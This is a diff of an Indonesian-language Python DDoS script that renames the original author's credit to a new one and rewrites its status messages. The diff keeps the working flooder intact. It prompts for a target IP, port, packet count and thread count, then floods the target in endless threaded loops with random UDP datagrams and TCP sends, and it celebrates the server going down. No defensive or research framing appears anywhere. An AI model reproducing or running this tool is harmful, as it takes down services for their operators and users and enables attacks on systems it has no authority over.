@@ -1,37 +1,36 @@
 #!/usr/bin/env python3
 #Semoga yang curi script ortunya sehat selalu
-#Ddos by XalBadoR
-#Join My T3Am : https://discord.gg/fRDAvXsU
+#Ddos by KalzzX
 import random
 import socket
 import threading
 import os
 
 os.system("clear")
-print("DDoSaTtack by Xalbador")
-print("Kalau Mau Pakek Ganteng Dulu")
+print("DDoSaTtack by KalzzX")
+print("Kalau Mau Pakek Bilang Dulu")
 print("Mau rename? PM me ")
-ip = str(input(" DdosAttackByXalbador | Ip:"))
-port = int(input(" DdosAttackByXalbador | Port:"))
-choice = str(input(" DdosAttackByXalbador | Gas Gak Ni?(y/n):"))
-times = int(input(" DdosAttackByXalbador | Packets:"))
-threads = int(input(" DdosAttackByXalbador | Threads:"))
+ip = str(input(" DdosAttackByKalzzX | Ip:"))
+port = int(input(" DdosAttackByKalzz | Port:"))
+choice = str(input(" DdosAttackByKalzzX | Gas Gak Ni?(y/n):"))
+times = int(input(" DdosAttackByKalzz | Packets:"))
+threads = int(input(" DdosAttackByKalzzX | Threads:"))
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
+	i = random.choice(("[?]","[!]","[x]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" | XalbadorX |")
+			print(i +" | Sabar lagi di ddos nih!!! |")
 		except:
-			print("[!] | Server down kontol!!! |")
+			print("[!] | Server orang down we!!! |")
 
 def run2():
 	data = random._urandom(16)
-	i = random.choice(("[*]","[!]","[#]"))
+	i = random.choice(("[?]","[!]","[x]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -39,10 +38,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Xalbador nih bos!!!")
+			print(i +" KalzzX nih dekk!!!")
 		except:
 			s.close()
-			print("[*] Down lagi kontol")
+			print("[*] Down lagi we!!!")
 
 for y in range(threads):
 	if choice == 'y':
